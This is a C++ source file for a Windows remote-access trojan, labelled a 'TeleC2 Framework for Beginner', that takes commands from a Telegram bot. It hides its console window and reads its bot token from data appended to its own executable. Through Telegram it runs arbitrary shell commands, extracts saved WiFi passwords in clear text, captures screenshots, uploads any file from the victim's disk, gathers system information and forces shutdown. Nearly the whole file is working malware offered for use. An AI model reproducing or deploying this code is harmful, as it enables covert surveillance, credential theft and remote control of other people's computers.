// TeleC2 Framework for Beginner
#include <windows.h>
#include <wininet.h>
#include <gdiplus.h>
#include <curl/curl.h>
#include "json.hpp"
#include <vector>
#include <string>
#include <thread>
#include <iostream>
#include <cstdio>
#include <algorithm>
#include <fstream>
#include <shlobj.h>

using json = nlohmann::json;
using namespace Gdiplus;

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "wininet.lib")

std::string BOT_TOKEN = "";
std::string ALLOWED_CHAT_ID = ""; 
long long last_update_id = 0;
const std::string CONFIG_MARKER = "---CONFIG_START---";

bool LoadDynamicConfig() {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    std::ifstream self(exePath, std::ios::binary);
    if (!self) return false;

    std::string content((std::istreambuf_iterator<char>(self)), std::istreambuf_iterator<char>());
    self.close();

    size_t pos = content.rfind(CONFIG_MARKER);
    if (pos == std::string::npos) return false;

    std::string configData = content.substr(pos + CONFIG_MARKER.length());
    size_t delim = configData.find("|");
    
    if (delim != std::string::npos) {
        BOT_TOKEN = configData.substr(0, delim);
        ALLOWED_CHAT_ID = configData.substr(delim + 1);
    } else {
        BOT_TOKEN = configData;
    }

    BOT_TOKEN.erase(std::remove(BOT_TOKEN.begin(), BOT_TOKEN.end(), '\r'), BOT_TOKEN.end());
    BOT_TOKEN.erase(std::remove(BOT_TOKEN.begin(), BOT_TOKEN.end(), '\n'), BOT_TOKEN.end());
    BOT_TOKEN.erase(std::remove(BOT_TOKEN.begin(), BOT_TOKEN.end(), ' '), BOT_TOKEN.end());
    
    ALLOWED_CHAT_ID.erase(std::remove(ALLOWED_CHAT_ID.begin(), ALLOWED_CHAT_ID.end(), '\r'), ALLOWED_CHAT_ID.end());
    ALLOWED_CHAT_ID.erase(std::remove(ALLOWED_CHAT_ID.begin(), ALLOWED_CHAT_ID.end(), '\n'), ALLOWED_CHAT_ID.end());
    ALLOWED_CHAT_ID.erase(std::remove(ALLOWED_CHAT_ID.begin(), ALLOWED_CHAT_ID.end(), ' '), ALLOWED_CHAT_ID.end());

    return !BOT_TOKEN.empty();
}

void SendTelegramMessage(const std::string& chat_id, const std::string& text) {
    CURL* curl = curl_easy_init();
    if (curl) {
        char* escapedText = curl_easy_escape(curl, text.c_str(), static_cast<int>(text.length()));
        if (escapedText) {
            std::string url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + chat_id + "&text=" + std::string(escapedText);
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, nullptr);
            curl_easy_perform(curl);
            curl_free(escapedText);
        }
        curl_easy_cleanup(curl);
    }
}

std::string GetSysteminfo() {
    HANDLE hPipeRead, hPipeWrite;
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    CreatePipe(&hPipeRead, &hPipeWrite, &sa, 0);
    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hPipeWrite; si.hStdError = hPipeWrite; si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = { 0 };
    CreateProcessA(NULL, (LPSTR)"systeminfo", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(hPipeWrite);
    char buffer[256]; DWORD bytesRead; std::string result = "";
    while (ReadFile(hPipeRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
        buffer[bytesRead] = 0; result += buffer;
    }
    CloseHandle(hPipeRead); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return result.empty() ? "No system information found." : result;
}

std::string GetAvailableDrives() {
    char drive_buffer[256];
    DWORD dr = GetLogicalDriveStringsA(sizeof(drive_buffer), drive_buffer);
    std::string drives_list = "";

    if (dr > 0 && dr <= sizeof(drive_buffer)) {
        char* p_drive = drive_buffer;
        while (*p_drive) {
            drives_list += std::string(p_drive) + " ";
            p_drive += strlen(p_drive) + 1;
        }
    }
    return drives_list.empty() ? "No drives found" : drives_list;
}

std::string GetDefaultInitialPath() {
    char username[256];
    DWORD size = sizeof(username);
    if (GetUserNameA(username, &size)) {
        return std::string("C:\\Users\\") + std::string(username) + "\\";
    }
    return "C:\\";
}

std::string current_path = GetDefaultInitialPath();

std::string OpenRemoteFile(std::string path) {
    HINSTANCE result = ShellExecuteA(NULL, "open", path.c_str(), NULL, NULL, SW_SHOWNORMAL);
    
    if ((INT_PTR)result > 32) {
        return "Successfully opened: " + path;
    } else {
        return "Failed to open: " + path + " (Error Code: " + std::to_string((INT_PTR)result) + ")";
    }
}

std::string GetWifiPasswords() {
    std::string command = "powershell -Command \"chcp 437; netsh wlan show profiles | Select-String ':\\s+(.+)$' | ForEach-Object { $n=$_.Matches.Groups[1].Value.Trim(); (netsh wlan show profile name=$n key=clear) | Select-String 'Key Content' | ForEach-Object { \\\"$n : $_\\\" } }\"";
    FILE* pipe = _popen(command.c_str(), "r");
    if (!pipe) return "Error: Failed to execute PowerShell.";
    char buffer[256]; std::string result = "";
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) result += buffer;
    _pclose(pipe);
    return result.empty() ? "No WiFi profiles found." : result;
}

void ExecuteAndSend(std::string cmd, std::string cid) {
    std::string fullCmd;
    
    if (cmd.rfind("cd ", 0) == 0 || cmd.rfind("CD ", 0) == 0) {
        fullCmd = "cd /d \"" + current_path + "\" && " + cmd + " && cd";
    } else {
        fullCmd = "cd /d \"" + current_path + "\" && " + cmd;
    }

    HANDLE hPipeRead, hPipeWrite;
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    CreatePipe(&hPipeRead, &hPipeWrite, &sa, 0);
    
    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hPipeWrite; si.hStdError = hPipeWrite; si.wShowWindow = SW_HIDE;
    
    PROCESS_INFORMATION pi = { 0 };
    std::string execCmd = "cmd.exe /c " + fullCmd;
    
    if (CreateProcessA(NULL, (LPSTR)execCmd.c_str(), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hPipeWrite);
        
        char buffer[4096];
        DWORD bytesRead;
        std::string chunk = "";
        
        while (ReadFile(hPipeRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
            buffer[bytesRead] = 0;
            chunk += buffer;
            
            if (chunk.length() > 3000) {
                SendTelegramMessage(cid, chunk);
                chunk = "";
                Sleep(500);
            }
        }
        
        if (cmd.rfind("cd ", 0) == 0 || cmd.rfind("CD ", 0) == 0) {
            size_t lastNewline = chunk.find_last_of("\n");
            if (lastNewline != std::string::npos) {
                std::string newPath = chunk.substr(0, lastNewline);
                newPath.erase(std::remove(newPath.begin(), newPath.end(), '\r'), newPath.end());
                if (GetFileAttributesA(newPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
                    current_path = newPath;
                    if (current_path.back() != '\\') current_path += "\\";
                }
            }
            chunk = "Current Directory: " + current_path;
        }

        if (!chunk.empty()) SendTelegramMessage(cid, chunk);
        
        CloseHandle(hPipeRead); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    } else {
        CloseHandle(hPipeWrite); CloseHandle(hPipeRead);
        SendTelegramMessage(cid, "Error: Failed to execute.");
    }
}


void UploadFileToTelegram(std::string chat_id, std::string filePath) {
    if (GetFileAttributesA(filePath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        SendTelegramMessage(chat_id, "Error: File not found or path is incorrect.");
        return;
    }

    CURL* curl = curl_easy_init();
    if (curl) {
        curl_mime* mime = curl_mime_init(curl);
        
        curl_mimepart* p1 = curl_mime_addpart(mime);
        curl_mime_name(p1, "chat_id");
        curl_mime_data(p1, chat_id.c_str(), -1);
        
        curl_mimepart* p2 = curl_mime_addpart(mime);
        curl_mime_name(p2, "document");
        curl_mime_filedata(p2, filePath.c_str());
        
        std::string url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
        
        SendTelegramMessage(chat_id, "Uploading file...");
        curl_easy_perform(curl);
        
        curl_mime_free(mime);
        curl_easy_cleanup(curl);
    }
}

void UploadImageToTelegram(std::string chat_id, std::string filePath) {
    CURL* curl = curl_easy_init();
    if (curl) {
        curl_mime* mime = curl_mime_init(curl);
        
        curl_mimepart* p1 = curl_mime_addpart(mime);
        curl_mime_name(p1, "chat_id");
        curl_mime_data(p1, chat_id.c_str(), -1);
        
        curl_mimepart* p2 = curl_mime_addpart(mime);
        curl_mime_name(p2, "photo");
        curl_mime_filedata(p2, filePath.c_str());
        
        std::string url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto";
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
        SendTelegramMessage(chat_id, "Uploading file...");

        CURLcode res = curl_easy_perform(curl);
        if(res == CURLE_OK) {
             SendTelegramMessage(chat_id, "Image upload completed successfully.");
        } else {
             SendTelegramMessage(chat_id, "Image upload failed.");
        }
        curl_mime_free(mime);
        curl_easy_cleanup(curl);
    }
}

void CaptureAndSendPhysicalPNG(std::string chat_id) {
    char tempPath[MAX_PATH]; GetTempPathA(MAX_PATH, tempPath);
    std::string filePath = std::string(tempPath) + "win_sys_util.png";
    int x = GetSystemMetrics(SM_CXSCREEN); int y = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(NULL); HDC memDC = CreateCompatibleDC(hdc);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdc, x, y);
    SelectObject(memDC, hBitmap); BitBlt(memDC, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
    Bitmap wbm(hBitmap, NULL);
    CLSID pngClsid = {0x557cf406, 0x1a04, 0x11d3, {0x9a,0x73,0x00,0x00,0xf8,0x1e,0xf3,0x2e}};
    std::wstring wideFilePath(filePath.begin(), filePath.end());
    wbm.Save(wideFilePath.c_str(), &pngClsid, NULL);
    ReleaseDC(NULL, hdc); DeleteDC(memDC); DeleteObject(hBitmap);
    CURL* curl = curl_easy_init();
    if (curl) {
        curl_mime* mime = curl_mime_init(curl);
        curl_mimepart* p1 = curl_mime_addpart(mime);
        curl_mime_name(p1, "chat_id"); curl_mime_data(p1, chat_id.c_str(), -1);
        curl_mimepart* p2 = curl_mime_addpart(mime);
        curl_mime_name(p2, "photo"); curl_mime_filedata(p2, filePath.c_str());
        std::string url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto";
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
        curl_easy_perform(curl);
        curl_mime_free(mime); curl_easy_cleanup(curl);
    }
    DeleteFileA(filePath.c_str());
}

void HandleCommand(const std::string& cmd, long long sender_id) {
    std::string cid = std::to_string(sender_id);

    if (cmd == "/screenshot") {
        std::thread(CaptureAndSendPhysicalPNG, cid).detach();
    }
    else if (cmd == "/shutdown") {
        SendTelegramMessage(cid, "System is shutting down now...");
        system("shutdown /s /t 0");
    }
    else if (cmd == "/wifipassword") {
        SendTelegramMessage(cid, GetWifiPasswords());
    }
    else if (cmd == "/systeminfo") {
        SendTelegramMessage(cid, GetSysteminfo());
    }
    else if (cmd.rfind("Cmd/", 0) == 0 || cmd.rfind("cmd/", 0) == 0) {
        ExecuteAndSend(cmd.substr(4), cid);
    }
        else if (cmd.rfind("/devicelist", 0) == 0) {
        SendTelegramMessage(cid, GetAvailableDrives());
    }
    else if (cmd == "/online") {
        SendTelegramMessage(cid, "Yes, the bot is online and ready to receive commands. /help");
    }
    else if (cmd.rfind("fupload/", 0) == 0) {
        std::string path = cmd.substr(8);
        std::thread(UploadFileToTelegram, cid, path).detach();
    }
    else if (cmd.rfind("pupload/", 0) == 0) {
        std::string path = cmd.substr(8);
        if (GetFileAttributesA(path.c_str()) == INVALID_FILE_ATTRIBUTES) {
            SendTelegramMessage(cid, "Error: File not found at " + path);
        } else {
            std::thread(UploadImageToTelegram, cid, path).detach();
        }
    }
    else if (cmd.rfind("open/", 0) == 0) {
        std::string path = cmd.substr(5);
        SendTelegramMessage(cid, OpenRemoteFile(path));
    }
        else if (cmd == "/pwd" || cmd == "/cwd") {
        SendTelegramMessage(cid, "Current Directory: " + current_path);
    }

    else if (cmd == "/help") {
        SendTelegramMessage(cid, "Commands: /help, /screenshot, /shutdown, /wifipassword, /systeminfo, /online, /devicelist, Cmd/<cmd>, open/<path>, fupload/<path>, pupload/<path>.");
    }
}

std::string GetUpdates() {
    std::string response = "";
    HINTERNET hInternet = InternetOpenA("BotAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return response;
    std::string url = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + std::to_string(last_update_id + 1) + "&timeout=30";
    DWORD timeout = 35000;
    InternetSetOptionA(hInternet, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
    HINTERNET hConnect = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    char buffer[4096]; 
    DWORD bytesRead;
    if (hConnect) {
        while (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
            buffer[bytesRead] = 0; 
            response += buffer;
        }
        InternetCloseHandle(hConnect);
    }
    InternetCloseHandle(hInternet);
    return response;
}

int main(int argc, char* argv[]) {
    if (!LoadDynamicConfig()) {
        std::cout << "[-] Warning: No embedded Config/Token found in this EXE. Using defaults if available." << std::endl;
    }
    ::Gdiplus::GdiplusStartupInput gdiInput;
    ULONG_PTR gdiToken;
    GdiplusStartup(&gdiToken, &gdiInput, NULL);
    curl_global_init(CURL_GLOBAL_ALL);
    HWND hwndConsole = GetConsoleWindow();
    if (hwndConsole) {
        ShowWindow(hwndConsole, SW_HIDE);
    }
    while (InternetCheckConnectionA("https://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0) == FALSE) {
        Sleep(5000);
    }
    if (!ALLOWED_CHAT_ID.empty()) {
        SendTelegramMessage(ALLOWED_CHAT_ID, "Computer is online and ready!. /help for commands.");
    }
    while (true) {
        std::string jsonResponse = GetUpdates();
        if (!jsonResponse.empty()) {
            try {
                auto data = json::parse(jsonResponse);
                if (data.contains("result") && data["result"].is_array()) {
                    for (auto& item : data["result"]) {
                        last_update_id = item["update_id"];
                        if (item.contains("message") && item["message"].contains("chat") && item["message"].contains("text")) {
                            long long sender_id = item["message"]["chat"]["id"];
                            std::string sender_id_str = std::to_string(sender_id);
                            
                            if (sender_id_str == ALLOWED_CHAT_ID) {
                                HandleCommand(item["message"]["text"], sender_id);
                            }
                        }
                    }
                }
            } catch (...) {}
        }
        Sleep(1000);
    }

    curl_global_cleanup();
    GdiplusShutdown(gdiToken);
    return 0;
}